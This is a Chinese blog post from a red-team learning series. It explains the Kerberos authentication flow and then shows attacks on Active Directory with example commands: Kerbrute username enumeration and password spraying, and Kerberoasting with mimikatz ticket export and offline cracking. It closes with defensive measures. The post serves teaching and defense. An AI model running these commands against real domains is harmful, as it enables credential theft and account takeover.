    <content type="html"><![CDATA[<h1 id="一、Kerberos-协议"><a href="#一、Kerberos-协议" class="headerlink" title="一、Kerberos 协议"></a>一、Kerberos 协议</h1><p>Kerberos 原意是希腊神话中看守冥界入口的恶犬刻耳柏洛斯，类似于「哈利波特·神秘魔法石」中守护魔法石的三头犬毛毛。</p><p>这里所讲的 Kerberos 是一种网络身份认证协议，个人猜测作者采用这个名字也正是为了体现出该协议里身份认证的特性，即通过 Kerberos 协议守护网络通信中的安全，下面就来详细看看 Kerberos 协议。</p><p>Kerberos 是一种由 MIT 提出用来在非安全网络中对个人通信进行身份认证的计算机网络授权协议，该协议使用 AES 对称加密算法为客户端和服务端之间提供强身份认证，在域环境下的身份认证利用的就是 Kerberos 协议。</p><p>在计算机通讯中，当客户端去访问服务端时，作为服务端需要判断对方是否有权限访问自己主机上的服务，作为安全人员我们想保证整个过程即使被拦截或者篡改也不会影响数据的安全性，Kerberos 协议正是为了解决这些问题而产生的。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210906154732.png"></p><p>上图是 Kerberos 的认证流程，协议中的名词缩写解释如下：</p><ul><li>AS (Authentication Service): 认证服务器</li><li>TGS (Ticket Granting Service): 票据授予服务器</li><li>KDC (Key Distribution Center): 密钥分发中心</li><li>TGT (Ticket Granting Ticket): 票据授权票据，或者说：票据的票据</li><li>ST (Servre Ticket): 服务票据</li></ul><p>根据上图，总共分为 6 步，这里一步一步进行解释</p><h2 id="第一阶段：客户端-Clinet-与认证服务器-AS-通信"><a href="#第一阶段：客户端-Clinet-与认证服务器-AS-通信" class="headerlink" title="第一阶段：客户端 Clinet 与认证服务器 AS 通信"></a>第一阶段：客户端 Clinet 与认证服务器 AS 通信</h2><p>首先用户在客户端输入自己的用户名和密码，此时客户端会将用户输入的密码转换为哈希值，这个哈希值就是客户端用户的<strong>用户密钥</strong>。</p><p>① 第一步，客户端向认证服务器发起请求，请求内容为自己的用户名、客户端地址和当前时间戳。</p><blockquote><p>此时客户端不会向认证服务器发送用户密钥，认证服务器会利用自己的本地数据库里对应客户端用户的密码生成用户密钥。</p></blockquote><p>② 第二步，认证服务器接收到客户端的请求，此时认证服务器会根据客户端传来的用户名在本地数据库中查找这个用户名。</p><blockquote><p>此时认证服务器只会查找具有相同用户名的用户，并不会判断客户端身份的可靠性。</p></blockquote><p>如果没有这个用户名，认证失败；如果存在该用户名，则认证服务器会认为用户存在，此时认证服务器会向客户端发送两条信息，分别如下：</p><ul><li>第一条信息：<strong>客户端与票据授予服务器的会话密钥。</strong>该会话密钥通过用户密钥进行加密，这个用户密钥就是认证服务器利用自己的本地数据库里对应客户端用户的密码生成的，该条消息中除了会话密钥还有票据授予服务器的地址和时间戳。</li><li>第二条信息：<strong>票据授权票据。</strong>票据授权票据通过票据授予服务器的密钥进行加密，票据授权票据里包括了第一条消息里的会话密钥、用户名、客户端地址、票据授权票据的有效时间以及时间戳。</li></ul><p>在客户端收到认证服务器的响应后，会尝试使用自己的用户密钥解密第一条消息，如果解密成功则会获得客户端与票据授予服务器的会话密钥以及时间戳等信息。接着客户端会判断时间戳是否在 5 分钟以内，如果大于 5 分钟则认为认证服务器是伪造的，小于 5 分钟则继续下一步认证。</p><p>至此，第一阶段通信完成。</p><h2 id="第二阶段：客户端-Clinet-与票据授予服务器-TGS-通信"><a href="#第二阶段：客户端-Clinet-与票据授予服务器-TGS-通信" class="headerlink" title="第二阶段：客户端 Clinet 与票据授予服务器 TGS 通信"></a>第二阶段：客户端 Clinet 与票据授予服务器 TGS 通信</h2><p>③ 第三步，客户端向票据授予服务器发起请求，请求里包含了两条信息：</p><ul><li>第一条信息：上一步认证服务器返回的第二条信息即票据授予票据，以及自己想要访问的服务 ID</li><li>第二条消息：使用客户端与票据授予服务器的会话密钥加密的用户名、时间戳。</li></ul><p>④ 第四步，票据授予服务器接收到请求，首先票据授予服务器会判断密钥分发中心的数据库中是否存在客户端想要访问的服务，如果不存在，认证失败，如果存在则继续接下来的认证。</p><p>接下来票据授予服务器会解密票据授予票据的内容，此时票据授予服务器获取到用户名、客户端与票据授予服务器的会话密钥、时间戳信息。</p><p>之后票据授予服务器使用客户端与票据授予服务器的会话密钥解密客户端发来的第二条信息，取出其中的用户名和票据授予票据里的用户信息进行对比，这里也会去判断取出的时间戳是否正常，如果全部没问题则认为客户端身份正常，继续下一步。</p><p>此时票据授予服务器向客户端发起响应，响应信息包含两条信息：</p><ul><li>第一条信息：<strong>使用服务端的密钥加密的服务票据</strong>，其中包括用户名、客户端 IP、客户端要访问的服务端信息、服务票据的有效时间、时间戳以及客户端与服务端的会话密钥。</li><li>第二条信息：<strong>使用客户端和票据授予服务器的会话密钥加密的内容</strong>，其中包括客户端和服务端的会话密钥、时间戳和服务票据的有效时间。</li></ul><p>在客户端收到票据授予服务器的响应后，会使用客户端和票据授予服务器的会话密钥解密收到的第二条信息，得到客户端和服务端的会话密钥，用于接下来的通信。这里同样的也会检查时间戳是否有误，值的注意的是这里客户端是无法解密返回的第一条信息的，因为第一条信息是利用服务端的密钥加密的。</p><p>至此，第二阶段通信完成。</p><h2 id="第三阶段：客户端-Clinet-与-服务端-Server-通信"><a href="#第三阶段：客户端-Clinet-与-服务端-Server-通信" class="headerlink" title="第三阶段：客户端 Clinet 与 服务端 Server 通信"></a>第三阶段：客户端 Clinet 与 服务端 Server 通信</h2><p>⑤ 第五步，客户端向服务端发送请求，请求内容包括两条信息：</p><ul><li>第一部分：上一步里票据授予服务器返回的使用服务端的密钥加密的服务票据。</li><li>第二部分：使用客户端和服务端的密钥加密的用户名和时间戳信息。</li></ul><p>⑥ 第六步，服务端解密出收到信息的第一部分内容，核对时间戳之后，取出客户端和服务端的会话密钥，利用客户端和服务端的会话密钥解密第二部分内容，获得用户名信息。</p><p>此时服务端会将第一部分解密后的信息与第二部分解密后的信息进行对比，如果一致则说明该客户端身份为真实身份，此时服务端向客户端响应使用客户端和服务端的会话密钥加密的表示验证通过的信息以及时间戳，客户端接受到响应后，验证时间戳正确后，便会认为这个服务端是可信任的了。</p><p>至此，第三阶段通信完成，到这里整个 Kerberos 认证也就完成了，接下来客户端与服务端就能放心的进行通信了。</p><h1 id="二、Kerberos-协议的利用"><a href="#二、Kerberos-协议的利用" class="headerlink" title="二、Kerberos 协议的利用"></a>二、Kerberos 协议的利用</h1><h2 id="1、用户名枚举"><a href="#1、用户名枚举" class="headerlink" title="1、用户名枚举"></a>1、用户名枚举</h2><p>当用户名输入正确或错误时，Kerberos 协议所返回的状态码是不同的，利用这一特性可以进行用户名枚举，这里使用 Kerbrute 工具进行演示。</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">kerbrute userenum <span class="token punctuation">-</span><span class="token punctuation">-</span>dc 192.168.7.7 <span class="token punctuation">-</span>d teamssix.com users.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109231512850.png"></p><h2 id="2、密码喷洒"><a href="#2、密码喷洒" class="headerlink" title="2、密码喷洒"></a>2、密码喷洒</h2><p>密码喷洒和用户名枚举原理一样，而且使用 Kerberos 协议对 Windows 密码进行暴力破解比其他方法要快得多，并且更加隐蔽，因为 Kerberos 身份验证即使失败也不会触发 4625 登录失败事件。</p><p>这里同样使用 Kerbrute 工具进行演示。</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">kerbrute passwordspray <span class="token punctuation">-</span><span class="token punctuation">-</span>dc 192.168.7.7 <span class="token punctuation">-</span>d teamssix.com users.txt 1qaz@WSX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109231512431.png"></p><h2 id="3、Kerberoast"><a href="#3、Kerberoast" class="headerlink" title="3、Kerberoast"></a>3、Kerberoast</h2><blockquote><p>关于 Kerberoast 和 SPN 的详细介绍可以参考我之前的文章：<a href="https://teamssix.com/210907-121204.html">https://teamssix.com/210907-121204.html</a></p></blockquote><p>Kerberoast 是一种针对 Kerberos 协议的利用方式，在需要使用某个服务向票据授予服务器发送请求时（即上述 Kerberos 协议里第 ③ 步），用户首先需要有个有效的票据授予票据。</p><p>当票据授予票据被验证有效且具有该服务的权限时，票据授予服务器会向用户返回使用服务端密钥加密的服务票据，该服务票据使用与该服务相关联计算机账号的密码加密，因此 RT 可以对加密后的内容进行离线哈希破解。</p><p><strong>Kerberoast 的利用思路：</strong><br>i. 查询 SPN<br>ii. 请求并导出服务票据<br>iii. 对服务票据进行爆破</p><blockquote><p>这里使用 Kerberoast 工具包作为演示，以下工具均在 Kerberoast 工具包里。</p></blockquote><h3 id="i-查询-SPN"><a href="#i-查询-SPN" class="headerlink" title="i. 查询 SPN"></a>i. 查询 SPN</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">.</span><span class="token operator">/</span>GetUserSPNs<span class="token punctuation">.</span>ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到 test 用户有个 MSSQLSvc/DBSRV.teamssix.com:1433 服务</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109231512937.png"></p><h3 id="ii-请求并导出服务票据"><a href="#ii-请求并导出服务票据" class="headerlink" title="ii. 请求并导出服务票据"></a>ii. 请求并导出服务票据</h3><p>这里请求 MSSQLSvc/DBSRV.teamssix.com:1433 服务并导出服务票据</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Add<span class="token operator">-</span>Type <span class="token operator">-</span>AssemblyName System<span class="token punctuation">.</span>IdentityModel  New<span class="token operator">-</span>Object System<span class="token punctuation">.</span>IdentityModel<span class="token punctuation">.</span>Tokens<span class="token punctuation">.</span>KerberosRequestorSecurityToken <span class="token operator">-</span>ArgumentList <span class="token string">"MSSQLSvc/DBSRV.teamssix.com:1433"</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以使用 klist 查看新的是否有票据缓存，有的话就可以使用 mimikatz 导出票据了</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">kerberos<span class="token operator">:</span><span class="token operator">:</span>list <span class="token operator">/</span><span class="token keyword">export</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109231513202.png"></p><h3 id="iii-对服务票据进行爆破"><a href="#iii-对服务票据进行爆破" class="headerlink" title="iii. 对服务票据进行爆破"></a>iii. 对服务票据进行爆破</h3><p>使用 Kerberoast 工具包里的 tgsrepcrack.py 就可以破解</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">python tgsrepcrack<span class="token punctuation">.</span>py password<span class="token punctuation">.</span>txt mssql<span class="token punctuation">.</span>kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109231513659.png"></p><h1 id="三、防范思路"><a href="#三、防范思路" class="headerlink" title="三、防范思路"></a>三、防范思路</h1><p>1、密码设置为复杂密码</p><p>2、在进行日志审计时，可以重点关注 ID 为 4769（请求 Kerberos 服务票据）的日志，如果有较多的 4769 日志，应进一步检查系统中是否存在恶意行为。</p><p>3、 Kerberos 协议的默认加密方式是 AES256_HMAC，而服务票据只有在加密方式是 RC4_HMAC_MD5 时才能破解，因此可以对当前系统的加密方式进行检查，看看是否为 AES256_HMAC 的加密方式。</p><blockquote><p>参考文章：</p><p><a href="https://zh.wikipedia.org/wiki/Kerberos">https://zh.wikipedia.org/wiki/Kerberos</a></p><p><a href="https://teamssix.com/210907-121204.html">https://teamssix.com/210907-121204.html</a></p><p><a href="https://www.jianshu.com/p/23a4e8978a30">https://www.jianshu.com/p/23a4e8978a30</a></p><p><a href="https://zh.wikipedia.org/wiki/%E5%88%BB%E8%80%B3%E6%9F%8F%E6%B4%9B%E6%96%AF">https://zh.wikipedia.org/wiki/%E5%88%BB%E8%80%B3%E6%9F%8F%E6%B4%9B%E6%96%AF</a></p><p><a href="https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/">https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3Kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一、Kerberos-协议&quot;&gt;&lt;a href=&quot;#一、Kerberos-协议&quot; class=&quot;headerlink&quot; title=&quot;一、Kerberos 协议&quot;&gt;&lt;/a&gt;一、Kerberos 协议&lt;/h1&gt;&lt;p&gt;Kerberos 原意是希腊神话中看守冥界入口的恶犬</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
</feed>
